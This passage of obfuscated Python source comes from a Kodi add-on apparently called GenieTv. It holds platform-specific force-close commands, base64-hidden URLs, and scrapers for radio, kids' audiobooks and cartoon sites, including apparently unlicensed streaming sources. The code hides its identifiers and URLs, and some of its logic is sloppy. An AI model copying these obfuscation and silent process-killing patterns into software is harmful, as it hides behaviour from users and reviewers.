  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif oO00oOo0OOO == 'linux' :
  print "############   try linux force close  #################"
  try : os . system ( 'killall XBMC' )
  except : pass
  try : os . system ( 'killall Kodi' )
  except : pass
  try : os . system ( 'killall -9 xbmc.bin' )
  except : pass
  try : os . system ( 'killall -9 kodi.bin' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif oO00oOo0OOO == 'android' :
  print "############   try android force close  #################"
  try : os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "Your system has been detected as Android, you " , "[COLOR=yellow][B]MUST[/COLOR][/B] force close XBMC/Kodi. [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Pulling the power cable is the simplest method to force close." )
 elif oO00oOo0OOO == 'windows' :
  print "############   try windows force close  #################"
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill XBMC.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill Kodi.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im Kodi.exe /f' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im XBMC.exe /f' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Use task manager and NOT ALT F4" )
 else :
  print "############   try atv force close  #################"
  try : os . system ( 'killall AppleTV' )
  except : pass
  print "############   try raspbmc force close  #################"
  try : os . system ( 'sudo initctl stop kodi' )
  except : pass
  try : os . system ( 'sudo initctl stop xbmc' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit via the menu." , "Your platform could not be detected so just pull the power cable." )
  if 62 - 62: oO0O
def ii1ooO ( ) :
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  return 'android'
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  return 'linux'
 elif xbmc . getCondVisibility ( 'system.platform.windows' ) :
  return 'windows'
 elif xbmc . getCondVisibility ( 'system.platform.osx' ) :
  return 'osx'
 elif xbmc . getCondVisibility ( 'system.platform.atv2' ) :
  return 'atv2'
 elif xbmc . getCondVisibility ( 'system.platform.ios' ) :
  return 'ios'
  if 51 - 51: I1IiI
  if 14 - 14: iI1Ii11iII1 % Ooo0OO0oOO % Oo - i11iIiiIii
  if 53 - 53: oO0O % Oo
def O0ooOo0o0Oo ( url ) :
 Oo0oO0ooo . create ( "[COLOR=green]GenieTv[/COLOR]" , "Renaming paths..." , '' , 'Please Wait' )
 for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( url ) :
  for file in i1oO0OO0 :
   if file . endswith ( ".xml" ) :
    Oo0oO0ooo . update ( 0 , "Fixing" , file , 'Please Wait' )
    IiIIIIIi = open ( ( os . path . join ( OooO0oOo , file ) ) ) . read ( )
    oOOo00O0OOOo = IiIIIIIi . replace ( oooOOOOO , 'special://home/' )
    oO00oo0o00o0o = open ( ( os . path . join ( OooO0oOo , file ) ) , mode = 'w' )
    oO00oo0o00o0o . write ( str ( oOOo00O0OOOo ) )
    oO00oo0o00o0o . close ( )
 oO00OoOO ( )
 if 31 - 31: OOoo0OO0 % i11i1 * OOoo0OO0
def IiI ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3d3dy5saXN0ZW5saXZlLmV1L3VrLmh0bWw=' ) )
 IiI11iII1 = re . compile ( '<tr>.+?<td><a href=".+?"><b>(.+?)</b>.+?<td><a href="(.+?)">' , re . DOTALL ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , ooooO0oOoOOoO in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , ooooO0oOoOOoO , 222 , ii11iIi1I + 'radio.png' )
  if 23 - 23: i11iIiiIii
def II1I11IIi ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3d3dy50b29uamV0LmNvbS8=' ) )
 IiI11iII1 = re . compile ( '<a href="(.+?)" style="font-size:.8em;">(.+?)</a>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.toonjet.com/' + ooooO0oOoOOoO , 8051 , ii11iIi1I + 'classictoons.png' )
def OoOOo ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)"><img src="(.+?)"' ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( '<a href="(.+?)">.+?</a></td></tr></table>' ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 in IiI11iII1 :
  if 'ol.gif' in IIIIiI11I11 :
   pass
  elif 'link_block_' in IIIIiI11I11 :
   pass
  elif '.png' in IIIIiI11I11 :
   pass
  else :
   oo0o0000Oo0 ( ( IIIIiI11I11 ) . replace ( 'http://www.toonjet.com/images/icons/' , '' ) . replace ( 'images/icons/' , '' ) . replace ( '.jpg' , '' ) . replace ( '_icon' , '' ) . replace ( '_' , ' ' ) , 'http://www.toonjet.com/' + url , 8052 , ii11iIi1I + 'vod.png' )
 for url in IIII11I1I :
  oo0o0000Oo0 ( 'NEXT PAGE' , 'http://www.toonjet.com/' + url , 8051 , ii11iIi1I + 'Next.png' )
def iii1oOO0oo ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<iframe width="640" height="480" src="(.+?)" frameborder="0" allowfullscreen></iframe>' ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  I1i1iii1Ii ( '[COLORgreen]PLAY[/COLOR]' , ( url ) . replace ( 'http://www.youtube.com/embed/' , '' ) . replace ( '?autoplay=0' , '' ) , 8043 , ii11iIi1I + 'classictoons.png' )
  if 29 - 29: OOOo0 * OoOoOO00 * OoooooooOO - ii11ii1ii * OoOoOO00
  if 41 - 41: O0
def I111I11I111 ( ) :
 iiiiI11ii ( 'Audio Books' , '' , 30011 , ii11iIi1I + 'audiobooks.png' , ii11iIi1I + 'audiobooks.png' , '' )
 iiiiI11ii ( 'Kids Audio Books' , '' , 30006 , ii11iIi1I + 'kidsaudiobooks.png' , ii11iIi1I + 'kidsaudiobooks.png' , '' )
 if 96 - 96: II1i1IiiIIi11 . O0 / II1i1IiiIIi11 % O0
def o0o000 ( ) :
 iiiiI11ii ( 'All' , '' , 30001 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 iiiiI11ii ( 'Popular' , '' , 30012 , ii11iIi1I + 'POPULARv.png' , ii11iIi1I + 'POPULARv.png' , '' )
 iiiiI11ii ( 'Search' , '' , 30013 , ii11iIi1I + 'search.png' , ii11iIi1I + 'search.png' , '' )
 if 50 - 50: iI1Ii11iII1 % i1IIi
def iii11II1I ( ) :
 Oo0oO00o = I1ii1Ii1 ( OO0o + 'books' + II11iiii1Ii )
 IiI11iII1 = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( Oo0oO00o )
 for oO00oooOOoOo0 , ooooO0oOoOOoO , iI111I11i in IiI11iII1 :
  if 'Parent' in oO00oooOOoOo0 :
   pass
  elif '2' in iI111I11i :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , ooooO0oOoOOoO , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 23 - 23: oO0O . OOooOOo + Oo - i11i1
def II1iiIiIiI ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 Oo0oO00o = I1ii1Ii1 ( OO0o + 'books' + II11iiii1Ii )
 IiI11iII1 = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( Oo0oO00o )
 for oO00oooOOoOo0 , ooooO0oOoOOoO , iI111I11i in IiI11iII1 :
  if iiI11iI in oO00oooOOoOo0 . lower ( ) :
   if '1' in iI111I11i :
    iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , ooooO0oOoOOoO , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '2' in iI111I11i :
    iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , ooooO0oOoOOoO , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '3' in iI111I11i :
    iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , ooooO0oOoOOoO , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 24 - 24: Oo - i1IIi + OOoo0OO0
    if 38 - 38: OoooooooOO / ii11ii1ii . O0 / i1IIi / Oo + iIii1I11I1II1
def ooO00O00oOO ( ) :
 Oo0oO00o = I1ii1Ii1 ( OO0o + 'books' + II11iiii1Ii )
 IiI11iII1 = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( Oo0oO00o )
 for oO00oooOOoOo0 , ooooO0oOoOOoO , iI111I11i in IiI11iII1 :
  if '1' in iI111I11i :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , ooooO0oOoOOoO , 3010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '2' in iI111I11i :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , ooooO0oOoOOoO , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '3' in iI111I11i :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , ooooO0oOoOOoO , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 40 - 40: II1i1IiiIIi11 . Ooo0OO0oOO + OOOo0 + ii11ii1ii + I1I1ii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 26 - 26: iIii1I11I1II1
def OOOo ( url ) :
 I1III1111iIi = url
 Oo0oO00o = I1ii1Ii1 ( url )
 IIII11I1I = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IIII11I1I :
  if 'mp3' in oO00oooOOoOo0 :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'wma' in oO00oooOOoOo0 :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'm4b' in oO00oooOOoOo0 :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '/' in oO00oooOOoOo0 :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 79 - 79: I1IiI % iI1Ii11iII1 % Oo
   if 29 - 29: OoooooooOO . OOOo0 % ii11ii1ii - II1i1IiiIIi11
   if 8 - 8: i1IIi
def iIiI1 ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 I1III1111iIi = url
 IiI11iII1 = re . compile ( '<li><a href="(.+?)">(.+?)</a></li>' ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  if 'Parent' in oO00oooOOoOo0 :
   pass
  elif '.db' in oO00oooOOoOo0 :
   pass
  elif '.jpg' in oO00oooOOoOo0 :
   pass
  elif '.html' in oO00oooOOoOo0 :
   pass
  elif '.doc' in oO00oooOOoOo0 :
   pass
  elif 'mp3' in oO00oooOOoOo0 :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif 'm4a' in oO00oooOOoOo0 :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 37 - 37: Ooo00oOo00o * i11iIiiIii / i11i1 % I1I1ii
   if 71 - 71: OoooooooOO
def iIiI1iiiI1ii ( ) :
 iiiiI11ii ( 'A-Z' , '' , 7 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 iiiiI11ii ( 'All' , '' , 3 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 iiiiI11ii ( 'Search' , '' , 14 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 if 29 - 29: II1i1IiiIIi11 . i11i1 . OOOo0 * I1IiI
def OO00o ( ) :
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9tcDNfZG93bmxvYWRzLmh0bQ==' ) )
 IiI11iII1 = re . compile ( '<td width=".+?" align="center">.+?<a href="(.*?)">.+?<img border="0" src="images/Squeeze%20(.*?).gif" width="74" height=".*?"></a></td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , IIIIiI11I11 in IiI11iII1 :
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + ooooO0oOoOOoO + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
  if '-x' in IIIIiI11I11 :
   pass
  else :
   iiiiI11ii ( IIIIiI11I11 , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) ) + ( ooooO0oOoOOoO ) . replace ( 'colour_it' , 'books_audio/audio_books_a' ) , 30008 , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9pbWFnZXMvU3F1ZWV6ZSUyMA==' ) ) + IIIIiI11I11 + '.gif' , ii11iIi1I + 'kodible.png' , '' )
   if 60 - 60: ii11ii1ii - Ooo0OO0oOO - OOOo0 / OOooOOo
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 81 - 81: OoOoOO00 + i11iIiiIii / II1i1IiiIIi11
 if 85 - 85: i11iIiiIii + I1I1ii * I1IiI
def iiiII ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<td width=".*?" height=".*?"><b>.*?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  if '</a>' in oO00oooOOoOo0 :
   pass
  elif '(' in oO00oooOOoOo0 :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 57 - 57: OOoo0OO0 . Oo + OoOoOO00
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 43 - 43: I1I1ii % II1i1IiiIIi11
def o0O0ooOOoO ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 o0Oo0oO0oOO00 = iiI11iI . lower ( )
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 IiI11iII1 = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if iiI11iI in oO00oooOOoOo0 . lower ( ) :
   if '</a>' in oO00oooOOoOo0 :
    pass
   elif '(' in oO00oooOOoOo0 :
    iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + ooooO0oOoOOoO , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   else :
    iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + ooooO0oOoOOoO , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 19 - 19: i11iIiiIii
    if 54 - 54: OoOoOO00 . OOoo0OO0
def oOOII1i11i1iIi11 ( ) :
 Oo0oO00o = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 IiI11iII1 = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if '</a>' in oO00oooOOoOo0 :
   pass
  elif '(' in oO00oooOOoOo0 :
   iiiiI11ii ( ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + ooooO0oOoOOoO , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + ooooO0oOoOOoO , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 83 - 83: oO0O
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 25 - 25: OOoo0OO0 + I1IiI . OOooOOo % I1IiI * i11i1
 if 32 - 32: i11iIiiIii - I1I1ii
def oo00ooOoo ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)">Download</a></b></td>' ) . findall ( Oo0oO00o )
 for url in IiI11iII1 :
  I1III1111iIi = ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) ) + url
  Resolve ( I1III1111iIi )
  if 28 - 28: oO0O
def iIIIiiiI11I ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<td width="247">(.*?)</td>.*?<a href="(.+?)">' , re . DOTALL ) . findall ( Oo0oO00o )
 for oO00oooOOoOo0 , url in IiI11iII1 :
  if '<p align' in oO00oooOOoOo0 :
   pass
  elif '&nbsp;' in oO00oooOOoOo0 :
   pass
  else :
   iIiIIIi ( ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 6 - 6: oO0O % i1IIi . oO0O * oO0O
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 81 - 81: i11i1 / iIii1I11I1II1 + iI1Ii11iII1
 if 49 - 49: i11i1 / OoooooooOO / OOOo0
def o0OooooOoOO ( ) :
 Oo0oO00o = cloudflare . source ( i1111 ( 'aHR0cDovL3dhdGNoY2FydG9vbnNvbmxpbmUuZXUv' ) )
 IiI11iII1 = re . compile ( 'class="menu-item menu-item-type-.+?><a href="([^"]*)">(.+?)</a></li>' , re . DOTALL ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'ongoing' in ooooO0oOoOOoO :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 21005 , ii11iIi1I + 'on-going.png' , '' , '' )
  if 'cartoon-series' in ooooO0oOoOOoO :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 21005 , ii11iIi1I + 'cartoonseries.png' , '' , '' )
  if 'disney' in ooooO0oOoOOoO :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 21005 , ii11iIi1I + 'disneytoons.png' , '' , '' )
  if 'genre' in ooooO0oOoOOoO :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 21005 , ii11iIi1I + 'cartoongenre.png' , '' , '' )
  if 'years' in ooooO0oOoOOoO :
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ooooO0oOoOOoO , 21005 , ii11iIi1I + 'years.png' , '' , '' )
def i1i1IIIIIIIi ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( '<a href="([^"]*)" title="([^"]*)" rel="nofollow" id="featured-thumbnail">.+?<div class="featured-thumbnail"><img width="140" height="200" src="([^"]*)"' , re . DOTALL ) . findall ( Oo0oO00o )
 oo0o0oOo = re . compile ( '<button type="button"><a href="([^"]*)" target="_blank">(.+?)</a>' ) . findall ( Oo0oO00o )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 , IIIIiI11I11 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 21006 , IIIIiI11I11 , IIIIiI11I11 , oO00oooOOoOo0 )
 for url , oO00oooOOoOo0 in oo0o0oOo :
  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in next :
  iIiIIIi ( '[COLORgreen]NEXT[/COLOR]' , url , 21005 , ii11iIi1I + 'Next.png' , '' , '' )
def OO0oOOo0o ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( '<li><a href="([^"]*)" >(.+?)</a></li>' , re . DOTALL ) . findall ( Oo0oO00o )
 I1III11iiii11i1 = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( Oo0oO00o )
 ooOo0OoO = re . compile ( 'src="([^"]*)" frameborder=' ) . findall ( Oo0oO00o )
 i1iiIIi1I = re . compile ( '<iframe src="([^"]*)"' ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 21007 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in ooOo0OoO :
  iIiIIIi ( '[COLORgreen]PLAY[/COLOR]' , 'http:' + url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url , oO00oooOOoOo0 in I1III11iiii11i1 :
  oo00O00oO ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 else :
  iIiIIIi ( '[COLORgreen]NO STREAMS AVAILABLE[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
def iiI1I1IIi11i1 ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  oo00O00oO ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
  if 45 - 45: oOO % OOooOOo - oOO
def i1i1 ( ) :
 oo0o0000Oo0 ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 oo0o0000Oo0 ( '[COLORgreen]ANIME[/COLOR]' , 'https://kissanime.to/AnimeList' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 69 - 69: ii11ii1ii - I1I1ii
def iiIIi1 ( ) :
 oo0o0000Oo0 ( '[COLORgreen]BY NAME[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20002 , ii11iIi1I + 'ORIGINCARTOON.png' )
 oo0o0000Oo0 ( '[COLORgreen]BY GENRE[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20003 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 10 - 10: OOoo0OO0 * oO0O % OoooooooOO
def O0Oo0Ooo ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( 'href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  if '?c=' in url :
   oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 78 - 78: Ooo00oOo00o % iI1Ii11iII1 * i1IIi
def O0iI ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( 'href="(.+?)" title="(.+?)">/n(.+?)</a><br/>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , Ii1I , oO00oooOOoOo0 in IiI11iII1 :
  if 'Genre' in url :
   oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 45 - 45: i1IIi - Oo / O0 . ii11ii1ii
def iI1 ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( 'src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , Ii1I , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , Ii1I )
  if 14 - 14: ii11ii1ii
def II1i ( url ) :
 Oo0oO00o = cloudflare . source ( url )
 IiI11iII1 = re . compile ( '<img width="120" height="165" src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , Ii1I , oO00oooOOoOo0 in IiI11iII1 :
